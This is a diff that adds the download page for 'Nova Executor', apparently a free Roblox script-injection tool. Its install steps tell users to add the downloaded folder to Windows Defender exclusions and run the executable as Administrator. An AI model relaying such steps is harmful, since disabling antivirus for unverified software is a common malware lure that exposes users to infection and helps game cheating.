@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Nova Executor — Download</title>
+<link rel="stylesheet" href="style.css">
+<style>
+.dl-hero{min-height:80vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:140px 24px 80px;position:relative;overflow:hidden}
+.dl-glow{position:absolute;bottom:-200px;left:50%;transform:translateX(-50%);width:700px;height:700px;border-radius:50%;background:radial-gradient(ellipse,rgba(110,80,255,.12) 0%,transparent 65%);pointer-events:none}
+.dtl{position:absolute;top:100px;left:56px;width:110px;height:110px;border:1px solid rgba(110,80,255,.2);border-right:none;border-bottom:none;pointer-events:none}
+.dbr{position:absolute;bottom:40px;right:56px;width:110px;height:110px;border:1px solid rgba(110,80,255,.2);border-left:none;border-top:none;pointer-events:none}
+.dbig{font-family:'Syne',sans-serif;font-size:clamp(52px,9vw,118px);font-weight:800;letter-spacing:-2px;line-height:.9;margin-bottom:28px}
+.dbig span{color:var(--acc)}
+.dsub{font-size:16px;color:var(--text2);margin-bottom:52px;font-weight:300;max-width:420px;margin-left:auto;margin-right:auto;line-height:1.7}
+.dacts{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap;margin-bottom:32px}
+.dnote{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:1px;line-height:2}
+.dnote span{color:var(--text2)}
+
+/* STEPS */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:2px;margin:60px 0 0}
+.step{background:var(--bg2);border:1px solid var(--b);padding:28px 24px;position:relative;transition:all .3s}
+.step:first-child{border-radius:14px 0 0 14px}
+.step:last-child{border-radius:0 14px 14px 0}
+.step:hover{border-color:var(--b2);background:var(--bg3)}
+.step-num{font-family:'Syne',sans-serif;font-size:48px;font-weight:800;color:rgba(110,80,255,.15);line-height:1;margin-bottom:12px}
+.step-title{font-family:'Syne',sans-serif;font-size:16px;font-weight:700;color:var(--text);margin-bottom:8px}
+.step-desc{font-size:13px;color:var(--text2);line-height:1.6;font-weight:300}
+
+/* REQUIRES */
+.req-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;margin-top:20px}
+.req{background:var(--bg2);border:1px solid var(--b);padding:20px 24px;display:flex;align-items:center;gap:14px;transition:all .2s}
+.req:first-child{border-radius:12px 0 0 12px}
+.req:last-child{border-radius:0 12px 12px 0}
+.req:hover{border-color:var(--b2)}
+.req-ico{font-size:22px;flex-shrink:0}
+.req-name{font-family:'Syne',sans-serif;font-size:14px;font-weight:700;color:var(--text)}
+.req-sub{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);margin-top:2px}
+
+@media(max-width:880px){.steps,.req-grid{grid-template-columns:1fr}.step:first-child,.step:last-child,.req:first-child,.req:last-child{border-radius:12px}}
+</style>
+</head>
+<body>
+<canvas id="bgc"></canvas>
+<div id="cd"></div><div id="cr"></div>
+<nav id="nav">
+  <a href="welcome.html" class="nl"><div class="nn">N</div><span class="nw">Nova</span></a>
+  <ul class="nlinks">
+    <li><a href="index.html">Home</a></li>
+    <li><a href="features.html">Features</a></li>
+    <li><a href="changelog.html">Changelog</a></li>
+    <li><a href="download.html">Download</a></li>
+  </ul>
+  <a href="https://www.youtube.com/@Lmaosbros" target="_blank" rel="noopener" class="nyt">
+    <svg width="13" height="13" viewBox="0 0 24 24"><path d="M23.5 6.2a3 3 0 0 0-2.1-2.1C19.5 3.5 12 3.5 12 3.5s-7.5 0-9.4.6A3 3 0 0 0 .5 6.2 31 31 0 0 0 0 12a31 31 0 0 0 .5 5.8 3 3 0 0 0 2.1 2.1c1.9.6 9.4.6 9.4.6s7.5 0 9.4-.6a3 3 0 0 0 2.1-2.1A31 31 0 0 0 24 12a31 31 0 0 0-.5-5.8zM9.75 15.5V8.5l6.25 3.5-6.25 3.5z" fill="currentColor"/></svg>
+    YouTube
+  </a>
+</nav>
+
+<div class="dl-hero">
+  <div class="dl-glow"></div><div class="dtl"></div><div class="dbr"></div>
+  <div class="ey rv" style="justify-content:center">Download</div>
+  <h1 class="dbig rv">GET <span>NOVA</span><br>FOR FREE</h1>
+  <p class="dsub rv">No key system. No ads. No nonsense.<br>Just download, extract, and run.</p>
+  <div class="dacts rv">
+    <a href="https://github.com/novaaexecutor/novaexecutor/raw/refs/heads/main/NovaExecutor.zip" class="bdl"><span>↓</span><span>Download v8.0</span></a>
+    <a href="https://www.youtube.com/@Lmaosbros" target="_blank" rel="noopener" class="bol">▶ YouTube</a>
+  </div>
+  <div class="dnote rv">REQUIRES: <span>WINDOWS 10/11</span> &nbsp;·&nbsp; <span>.NET 8</span> &nbsp;·&nbsp; <span>ROBLOX INSTALLED</span><br>Add to antivirus exclusions before running.</div>
+</div>
+
+<div class="tw"><div class="tt tr">
+  <div class="ti"><span class="s">✦</span>No Ads<span class="s">✦</span>No Key<span class="s">✦</span>No Paywalls<span class="s">✦</span>Windows 10/11<span class="s">✦</span>.NET 8<span class="s">✦</span>Auto Updater<span class="s">✦</span>Desktop Shortcut<span class="s">✦</span>Defender Whitelist<span class="s">✦</span>Free Forever</div>
+  <div class="ti"><span class="s">✦</span>No Ads<span class="s">✦</span>No Key<span class="s">✦</span>No Paywalls<span class="s">✦</span>Windows 10/11<span class="s">✦</span>.NET 8<span class="s">✦</span>Auto Updater<span class="s">✦</span>Desktop Shortcut<span class="s">✦</span>Defender Whitelist<span class="s">✦</span>Free Forever</div>
+</div></div>
+
+<!-- INSTALL STEPS -->
+<div class="page-wrap" style="padding-top:80px">
+  <div class="ey rv">How to install</div>
+  <h2 class="rv" style="font-family:'Syne',sans-serif;font-size:clamp(32px,4vw,56px);font-weight:800;letter-spacing:-1px;margin-bottom:0">SETUP IN<br><span style="color:var(--acc)">4 STEPS</span></h2>
+  <div class="steps rv">
+    <div class="step"><div class="step-num">01</div><div class="step-title">Download</div><div class="step-desc">Click the download button above to get NovaExecutor.zip from GitHub.</div></div>
+    <div class="step"><div class="step-num">02</div><div class="step-title">Whitelist</div><div class="step-desc">Add the extracted folder to Windows Defender exclusions to prevent false positives.</div></div>
+    <div class="step"><div class="step-num">03</div><div class="step-title">Extract</div><div class="step-desc">Extract the ZIP file to a permanent folder, e.g. C:\Nova\</div></div>
+    <div class="step"><div class="step-num">04</div><div class="step-title">Run</div><div class="step-desc">Open Roblox, then run NovaExecutor.exe as Administrator and click Inject.</div></div>
+  </div>
+
+  <!-- REQUIREMENTS -->
+  <div class="ey rv" style="margin-top:64px">Requirements</div>
+  <div class="req-grid rv">
+    <div class="req"><div class="req-ico">🪟</div><div><div class="req-name">Windows 10 / 11</div><div class="req-sub">64-bit required</div></div></div>
+    <div class="req"><div class="req-ico">⚙️</div><div><div class="req-name">.NET 8 Runtime</div><div class="req-sub">download from microsoft.com</div></div></div>
+    <div class="req"><div class="req-ico">🎮</div><div><div class="req-name">Roblox Installed</div><div class="req-sub">latest version recommended</div></div></div>
+  </div>
+</div>
+
+<footer>
+  <div class="fl"><div class="fn2">N</div><div><div class="fname2">NOVA EXECUTOR</div><div class="fcopy">© 2025 · v8.0 · Free Forever</div></div></div>
+  <ul class="flinks">
+    <li><a href="features.html">Features</a></li>
+    <li><a href="changelog.html">Changelog</a></li>
+    <li><a href="download.html">Download</a></li>
+    <li><a href="https://www.youtube.com/@Lmaosbros" target="_blank">YouTube</a></li>
+  </ul>
+</footer>
+<script src="app.js"></script>
+</body>
+</html>
